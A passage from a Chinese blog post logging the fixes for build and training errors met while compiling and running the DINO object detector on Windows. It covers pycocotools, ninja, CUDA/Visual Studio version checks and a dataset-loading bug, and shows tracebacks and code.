class="keyword">for</span> ann <span class="keyword">in</span> anns:</span><br><span class="line">        rle = coco.annToRLE(ann)        <span class="comment"># 解码</span></span><br><span class="line">        mask = mask_utils.decode(rle)   <span class="comment"># 生成原图mask</span></span><br><span class="line">        </span><br></pre></td></tr></table></figure><hr><h1 id="3-遇到的问题"><a href="#3-遇到的问题" class="headerlink" title="3 遇到的问题"></a>3 遇到的问题</h1><h2 id="3-1-ERROR-Could-not-build-wheels-for-pycocotools"><a href="#3-1-ERROR-Could-not-build-wheels-for-pycocotools" class="headerlink" title="3.1 ERROR: Could not build wheels for pycocotools"></a>3.1 ERROR: Could not build wheels for pycocotools</h2><p>完整报错如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cl: 命令行 error D8021 :无效的数值参数“/Wno-cpp”</span><br><span class="line">    error: <span class="built_in">command</span> <span class="string">&#x27;D:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\VC\\Tools\\MSVC\\14.40.33807\\bin\\HostX86\\x64\\cl.exe&#x27;</span> failed with <span class="built_in">exit</span> code 2</span><br><span class="line">    [end of output]</span><br><span class="line"></span><br><span class="line">note: This error originates from a subprocess, and is likely not a problem with pip.</span><br><span class="line">ERROR: Failed building wheel <span class="keyword">for</span> pycocotools</span><br><span class="line">Running setup.py clean <span class="keyword">for</span> pycocotools</span><br><span class="line">Failed to build pycocotools</span><br><span class="line">ERROR: Could not build wheels <span class="keyword">for</span> pycocotools, <span class="built_in">which</span> is required to install pyproject.toml-based projects</span><br></pre></td></tr></table></figure><p>通过以下博客进行解决：</p><p><a href="https://blog.csdn.net/weixin_41010198/article/details/94053130" title=" 错误：cl: 命令行 error D8021 :无效的数值参数“/Wno-cpp”-CSDN博客 文章浏览阅读1.6w次，点赞55次，收藏72次。错误：cl: 命令行 error D8021 :无效的数值参数“/Wno-cpp”文章目录：一、错误原因二、错误解决1、下载源码2、修改setup.py文件3、编译一、错误原因我是在运行这个项目的时候出现的错误，主要是用到pycocotools库包，在安装的过程需要进行编译，编译就会出现这个错误。二、错误解决最好是通过源码进行安装，不要用pip in https://blog.csdn.net/weixin_41010198/article/details/94053130"> 错误：cl: 命令行 error D8021 :无效的数值参数“&#x2F;Wno-cpp”-CSDN博客 文章浏览阅读1.6w次，点赞55次，收藏72次。错误：cl: 命令行 error D8021 :无效的数值参数“&#x2F;Wno-cpp”文章目录：一、错误原因二、错误解决1、下载源码2、修改setup.py文件3、编译一、错误原因我是在运行这个项目的时候出现的错误，主要是用到pycocotools库包，在安装的过程需要进行编译，编译就会出现这个错误。二、错误解决最好是通过源码进行安装，不要用pip in https://blog.csdn.net/weixin_41010198&#x2F;article&#x2F;details&#x2F;94053130</a></p><h2 id="3-2-subprocess-CalledProcessError-Command-‘-‘ninja’-‘-v’-’-returned-non-zero-exit-status-1"><a href="#3-2-subprocess-CalledProcessError-Command-‘-‘ninja’-‘-v’-’-returned-non-zero-exit-status-1" class="headerlink" title="3.2 subprocess.CalledProcessError: Command ‘[‘ninja’, ‘-v’]’ returned non-zero exit status 1."></a>3.2 subprocess.CalledProcessError: Command ‘[‘ninja’, ‘-v’]’ returned non-zero exit status 1.</h2><p>完整报错如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v11.8\include\crt/host_config.h(153): fatal error C1189: <span class="comment">#error:  -- unsupported Microsoft Visual Studio version! Only the versions between 2017 and 2022 (inclusive) are supported! The nvcc flag &#x27;-allow-unsupported-compiler&#x27; can be used to override this version check; however, using an unsupported host compiler may cause compilation failure or incorrect run time execution. Use at your own risk.</span></span><br><span class="line">ms_deform_attn_cuda.cu</span><br><span class="line">ninja: build stopped: subcommand failed.</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;F:\anaconda\anaconda3\envs\DeltaZero\lib\site-packages\torch\utils\cpp_extension.py&quot;</span>, line 1900, <span class="keyword">in</span> _run_ninja_build</span><br><span class="line">    subprocess.run(</span><br><span class="line">  File <span class="string">&quot;F:\anaconda\anaconda3\envs\DeltaZero\lib\subprocess.py&quot;</span>, line 526, <span class="keyword">in</span> run</span><br><span class="line">    raise CalledProcessError(retcode, process.args,</span><br><span class="line">subprocess.CalledProcessError: Command <span class="string">&#x27;[&#x27;</span>ninja<span class="string">&#x27;, &#x27;</span>-v<span class="string">&#x27;]&#x27;</span> returned non-zero <span class="built_in">exit</span> status 1.</span><br></pre></td></tr></table></figure><p>通过以下方法得以解决：</p><ul><li>将anaconda环境下的  lib&#x2F;python3.6&#x2F;site-packages&#x2F;torch&#x2F;utils&#x2F;cpp_extension.py文件中的[‘ninja’,’-v’]改成[‘ninja’,’–v’] 或者[‘ninja’,’–version’]</li></ul><h2 id="3-3-LINK-fatal-error-LNK1181-无法打开输入文件"><a href="#3-3-LINK-fatal-error-LNK1181-无法打开输入文件" class="headerlink" title="3.3 LINK: fatal error LNK1181: 无法打开输入文件"></a>3.3 LINK: fatal error LNK1181: 无法打开输入文件</h2><p>完整报错如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LINK : fatal error LNK1181: 无法打开输入文件“D:\Code\Paper-code\DINO\models\dino\ops\build\temp.win-amd64-cpython-310\Release\Code\Paper-code\DINO\models\dino\ops\src\cuda\ms_deform_attn_cuda.obj”</span><br><span class="line">error: <span class="built_in">command</span> <span class="string">&#x27;D:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\VC\\Tools\\MSVC\\14.40.33807\\bin\\HostX86\\x64\\link.exe&#x27;</span> failed with <span class="built_in">exit</span> code 1181</span><br></pre></td></tr></table></figure><p>通过以下方法得以解决：</p><p>将ninja关闭，修改如图所示，添加红框内的内容，<code>setup.py</code>文件中</p><p><img src="/2024/07/26/2024%E5%B9%B4X-Team%E5%A4%8F%E4%BB%A4%E8%90%A5%E8%80%83%E6%A0%B8%E4%BB%BB%E5%8A%A12/image_lCKkplHnpU.png"></p><h2 id="3-4-–unsupported-Microsoft-Visual-Studio-version"><a href="#3-4-–unsupported-Microsoft-Visual-Studio-version" class="headerlink" title="3.4 –unsupported Microsoft Visual Studio version"></a>3.4 –unsupported Microsoft Visual Studio version</h2><p>完整报错如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v11.8\include\crt/host_config.h(153): fatal error C1189: <span class="comment">#error:  -- unsupported Microsoft Visual Studio version! Only the versions between 2017 and 2022 (inclusive) are supported! The nvcc flag &#x27;-allow-unsupported-compiler&#x27; can be used to override this version check; however, using an unsupported host compiler may cause compilation failure or incorrect run time execution. Use at your own risk.</span></span><br><span class="line">error: <span class="built_in">command</span> <span class="string">&#x27;C:\\Program Files\\NVIDIA GPU Computing Toolkit\\CUDA\\v11.8\\bin\\nvcc.exe&#x27;</span> failed with <span class="built_in">exit</span> code 2</span><br></pre></td></tr></table></figure><p>原因是因为<code>CUDA</code>版本需要与微软的C&#x2F;C++编译器版本不匹配，需要修改以下路径中的源文件，并将<code>_MSC_VER &gt;=</code>后面的数值修改为与自己vs的对应版本。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v10.0\include\crt\host_config.h</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>VS2022</code>的对应数值为1940，查看的代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> _MSC_VER &gt;= 1940</span></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Visual Studio 2022&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> _MSC_VER &gt;= 1920</span></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Visual Studio 2019&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> _MSC_VER &gt;= 1910</span></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Visual Studio 2017&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> _MSC_VER &gt;= 1900</span></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Visual Studio 2015&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> _MSC_VER &gt;= 1800</span></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Visual Studio 2013&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> _MSC_VER &gt;= 1700</span></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Visual Studio 2012&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> _MSC_VER &gt;= 1600</span></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Visual Studio 2010&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Unknown Version&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>修改源文件如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> defined(_WIN32)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> _MSC_VER <span class="string">&lt; 1910 || _MSC_VER &gt;</span> 1940</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">error</span> -- unsupported Microsoft Visual Studio version! Only the versions between 2017 and 2022 (inclusive) are supported! The nvcc flag <span class="string">&#x27;-allow-unsupported-compiler&#x27;</span> can be used to override this version check; however, using an unsupported host compiler may cause compilation failure or incorrect run time execution. Use at your own risk.</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> _MSC_VER &gt;= 1910 &amp;&amp; _MSC_VER &lt;= 1940</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> message(<span class="string">&quot;support for this version of Microsoft Visual Studio has been deprecated! Only the versions between 2017 and 2022 (inclusive) are supported!&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* (_MSC_VER &lt; 1910 || _MSC_VER &gt;= 1940) || (_MSC_VER &gt;= 1910 &amp;&amp; _MSC_VER &lt; 1910) */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* _WIN32 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span>  <span class="comment">/* !__NV_NO_HOST_COMPILER_CHECK */</span></span></span><br></pre></td></tr></table></figure><p>最后编译成功：</p><p><img src="/2024/07/26/2024%E5%B9%B4X-Team%E5%A4%8F%E4%BB%A4%E8%90%A5%E8%80%83%E6%A0%B8%E4%BB%BB%E5%8A%A12/image_HTvMiCGXzr.png"></p><h2 id="3-5-TypeError-iteration-over-a-0-d-tensor"><a href="#3-5-TypeError-iteration-over-a-0-d-tensor" class="headerlink" title="3.5 TypeError: iteration over a 0-d tensor"></a>3.5 TypeError: iteration over a 0-d tensor</h2><p>在训练模型的过程中遇到报错如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">File <span class="string">&quot;D:\Code\Paper-code\DINO\models\dino\dn_components.py&quot;</span>, line <span class="number">36</span>, in prepare_for_cdn</span><br><span class="line">    known_num = [<span class="built_in">sum</span>(k) <span class="keyword">for</span> k in known]</span><br><span class="line">  File <span class="string">&quot;D:\Code\Paper-code\DINO\models\dino\dn_components.py&quot;</span>, line <span class="number">36</span>, in &lt;listcomp&gt;</span><br><span class="line">    known_num = [<span class="built_in">sum</span>(k) <span class="keyword">for</span> k in known]</span><br><span class="line">  File <span class="string">&quot;F:\anaconda\anaconda3\envs\DeltaZero\lib\site-packages\torch\_tensor.py&quot;</span>, line <span class="number">916</span>, in __iter__    </span><br><span class="line">    raise <span class="built_in">TypeError</span>(<span class="string">&quot;iteration over a 0-d tensor&quot;</span>)</span><br><span class="line">TypeError: iteration over a <span class="number">0</span>-d tensor</span><br></pre></td></tr></table></figure><p>简单来说就行对一个0维的张量进行迭代，导致出错，与其相关的部分代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">targets, dn_number, label_noise_ratio, box_noise_scale = dn_args</span><br><span class="line"><span class="comment"># positive and negative dn queries</span></span><br><span class="line">dn_number = dn_number * <span class="number">2</span></span><br><span class="line">known = [(torch.ones_like(t[<span class="string">&#x27;labels&#x27;</span>])).cuda() <span class="keyword">for</span> t <span class="keyword">in</span> targets]</span><br><span class="line">batch_size = <span class="built_in">len</span>(known)</span><br><span class="line">known_num = [<span class="built_in">sum</span>(k) <span class="keyword">for</span> k <span class="keyword">in</span> known]</span><br></pre></td></tr></table></figure><p>将变量<code>targets, dn_number, label_noise_ratio, box_noise_scale</code>打印输出结果如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; <span class="attr">&quot;targets&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span></span><br><span class="line">      <span class="punctuation">&#123;</span></span><br><span class="line">           &#x27;image_id&#x27;<span class="punctuation">:</span> tensor(<span class="number">10</span><span class="punctuation">,</span> device=&#x27;cuda<span class="punctuation">:</span><span class="number">0</span>&#x27;)<span class="punctuation">,</span> </span><br><span class="line">           &#x27;labels&#x27;<span class="punctuation">:</span> tensor(<span class="number">1</span><span class="punctuation">,</span> device=&#x27;cuda<span class="punctuation">:</span><span class="number">0</span>&#x27;)<span class="punctuation">,</span> </span><br><span class="line">           &#x27;size&#x27;<span class="punctuation">:</span> tensor(<span class="punctuation">[</span> <span class="number">800</span><span class="punctuation">,</span> <span class="number">1200</span><span class="punctuation">]</span><span class="punctuation">,</span> device=&#x27;cuda<span class="punctuation">:</span><span class="number">0</span>&#x27;)<span class="punctuation">,</span> </span><br><span class="line">           &#x27;orig_size&#x27;<span class="punctuation">:</span> tensor(<span class="punctuation">[</span><span class="number">576</span><span class="punctuation">,</span> <span class="number">864</span><span class="punctuation">]</span><span class="punctuation">,</span> device=&#x27;cuda<span class="punctuation">:</span><span class="number">0</span>&#x27;)</span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">           &#x27;image_id&#x27;<span class="punctuation">:</span> tensor(<span class="number">10</span><span class="punctuation">,</span> device=&#x27;cuda<span class="punctuation">:</span><span class="number">0</span>&#x27;)<span class="punctuation">,</span> </span><br><span class="line">           &#x27;labels&#x27;<span class="punctuation">:</span> tensor(<span class="number">11</span><span class="punctuation">,</span> device=&#x27;cuda<span class="punctuation">:</span><span class="number">0</span>&#x27;)<span class="punctuation">,</span> </span><br><span class="line">           &#x27;size&#x27;<span class="punctuation">:</span> tensor(<span class="punctuation">[</span> <span class="number">704</span><span class="punctuation">,</span> <span class="number">1056</span><span class="punctuation">]</span><span class="punctuation">,</span> device=&#x27;cuda<span class="punctuation">:</span><span class="number">0</span>&#x27;)<span class="punctuation">,</span> </span><br><span class="line">           &#x27;orig_size&#x27;<span class="punctuation">:</span> tensor(<span class="punctuation">[</span><span class="number">576</span><span class="punctuation">,</span> <span class="number">864</span><span class="punctuation">]</span><span class="punctuation">,</span> device=&#x27;cuda<span class="punctuation">:</span><span class="number">0</span>&#x27;)</span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br><span class="line">&gt;&gt;&gt; <span class="attr">&quot;dn_number&quot;</span><span class="punctuation">:</span> <span class="number">100</span></span><br><span class="line">&gt;&gt;&gt; <span class="attr">&quot;label_noise_ration&quot;</span><span class="punctuation">:</span> <span class="number">0.5</span></span><br><span class="line">&gt;&gt;&gt; <span class="attr">&quot;box_noise_scale&quot;</span><span class="punctuation">:</span> <span class="number">1.0</span></span><br></pre></td></tr></table></figure><p>可以看到变量target中是1张图片中的两个目标检测的信息。</p><p>感觉是不是targets中应该是2个维度：<code>[batch_size×1]</code>，所以应该是2维变量，但是上述报错是因为是1个1维变量，在遍历其中的每一个变量时，就是0维的，所以出了问题。</p><p>为什么是2维的，推测是第二维是每张图片，但是每张图片中不止1个要检测的目标，所以是2维的，但是我修改的代码把同一个图片中的多个不同的要检测的目标给分割成了不同的图片，所以出错，现在应该看一个数据集处理的代码。</p><p>从下面的<code>json</code>文件中可以看到，在数据处理的时候就把同一张图片中的2个不同的目标给分割开了。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;image_id&quot;</span><span class="punctuation">:</span> <span class="number">2</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;bbox&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="number">136</span><span class="punctuation">,</span></span><br><span class="line">        <span class="number">190</span><span class="punctuation">,</span></span><br><span class="line">        <span class="number">79</span><span class="punctuation">,</span></span><br><span class="line">        <span class="number">109</span></span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;category&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;file_name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;00002.png&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;image_id&quot;</span><span class="punctuation">:</span> <span class="number">2</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;bbox&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="number">219</span><span class="punctuation">,</span></span><br><span class="line">        <span class="number">172</span><span class="punctuation">,</span></span><br><span class="line">        <span class="number">63</span><span class="punctuation">,</span></span><br><span class="line">        <span class="number">131</span></span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;category&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;file_name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;00002.png&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>所以需要修改数据集预处理的代码，发现问题了，加载数据集使用的是<code>coco_panoptic.py</code>的代码，但是应该在<code>coco.py</code>基础上修改。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Copyright (c) Facebook, Inc. and its affiliates. All Rights Reserved</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> coco <span class="keyword">import</span> make_coco_transforms</span><br><span class="line"><span class="keyword">from</span> DINO.util.box_ops <span class="keyword">import</span> masks_to_boxes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ExDark</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, img_folder, ann_folder, ann_file, transforms=<span class="literal">None</span>, return_masks=<span class="literal">True</span></span>):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(ann_file, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="variable language_">self</span>.exdark = json.load(f)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 对“images”字段进行排序，以便它们与“annotations”对齐</span></span><br><span class="line">        <span class="comment"># i.e., in alphabetical order</span></span><br><span class="line">        <span class="comment"># self.exdark[&#x27;images&#x27;] = sorted(self.exdark[&#x27;images&#x27;], key=lambda x: x[&#x27;id&#x27;])</span></span><br><span class="line">        <span class="comment"># sanity check</span></span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>.img_folder = img_folder</span><br><span class="line">        <span class="variable language_">self</span>.ann_folder = ann_folder</span><br><span class="line">        <span class="variable language_">self</span>.ann_file = ann_file</span><br><span class="line">        <span class="variable language_">self</span>.transforms = transforms</span><br><span class="line">        <span class="variable language_">self</span>.return_masks = return_masks</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__getitem__</span>(<span class="params">self, idx</span>):</span><br><span class="line">        ann_info = <span class="variable language_">self</span>.exdark[<span class="string">&#x27;annotations&#x27;</span>][idx] <span class="keyword">if</span> <span class="string">&quot;annotations&quot;</span> <span class="keyword">in</span> <span class="variable language_">self</span>.exdark <span class="keyword">else</span> <span class="variable language_">self</span>.exdark[<span class="string">&#x27;images&#x27;</span>][idx]</span><br><span class="line">        img_path = Path(<span class="variable language_">self</span>.img_folder) / (<span class="string">&quot;2015_&quot;</span> + ann_info[<span class="string">&#x27;file_name&#x27;</span>])</span><br><span class="line">        ann_path = Path(<span class="variable language_">self</span>.ann_folder) / ann_info[<span class="string">&#x27;file_name&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        img = Image.<span class="built_in">open</span>(img_path).convert(<span class="string">&#x27;RGB&#x27;</span>)</span><br><span class="line">        w, h = img.size</span><br><span class="line"></span><br><span class="line">        target = &#123;<span class="string">&#x27;image_id&#x27;</span>: torch.tensor(ann_info[<span class="string">&#x27;image_id&#x27;</span>])&#125;</span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.return_masks:</span><br><span class="line">            target[<span class="string">&#x27;masks&#x27;</span>] = masks</span><br><span class="line"></span><br><span class="line">        <span class="comment"># masks = torch.as_tensor(masks, dtype=torch.uint8)</span></span><br><span class="line">        labels = torch.tensor(ann_info[<span class="string">&#x27;category&#x27;</span>], dtype=torch.int64)</span><br><span class="line"></span><br><span class="line">        target[<span class="string">&#x27;labels&#x27;</span>] = labels</span><br><span class="line"></span><br><span class="line">        <span class="comment"># target[&quot;boxes&quot;] = masks_to_boxes(masks)</span></span><br><span class="line"></span><br><span class="line">        target[<span class="string">&#x27;size&#x27;</span>] = torch.as_tensor([<span class="built_in">int</span>(h), <span class="built_in">int</span>(w)])</span><br><span class="line">        target[<span class="string">&#x27;orig_size&#x27;</span>] = torch.as_tensor([<span class="built_in">int</span>(h), <span class="built_in">int</span>(w)])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.transforms <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            img, target = <span class="variable language_">self</span>.transforms(img, target)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> img, target</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__len__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">len</span>(<span class="variable language_">self</span>.exdark[<span class="string">&#x27;images&#x27;</span>])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_height_and_width</span>(<span class="params">self, idx</span>):</span><br><span class="line">        img_info = <span class="variable language_">self</span>.exdark[<span class="string">&#x27;images&#x27;</span>][idx]</span><br><span class="line">        height = img_info[<span class="string">&#x27;height&#x27;</span>]</span><br><span class="line">        width = img_info[<span class="string">&#x27;width&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> height, width</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build</span>(<span class="params">image_set, args</span>):</span><br><span class="line">    img_folder_root = Path(args.exdark_path)</span><br><span class="line">    ann_folder_root = Path(args.exdark_path)</span><br><span class="line">    <span class="keyword">assert</span> img_folder_root.exists(), <span class="string">f&#x27;provided ExDark path <span class="subst">&#123;img_folder_root&#125;</span> does not exist&#x27;</span></span><br><span class="line">    <span class="keyword">assert</span> ann_folder_root.exists(), <span class="string">f&#x27;provided ExDark path <span class="subst">&#123;ann_folder_root&#125;</span> does not exist&#x27;</span></span><br><span class="line">    mode = <span class="string">&#x27;panoptic&#x27;</span></span><br><span class="line">    PATHS = &#123;</span><br><span class="line">        <span class="string">&quot;train&quot;</span>: (<span class="string">&quot;train&quot;</span>, Path(<span class="string">&quot;annotations&quot;</span>) / <span class="string">f&#x27;<span class="subst">&#123;mode&#125;</span>_train.json&#x27;</span>),</span><br><span 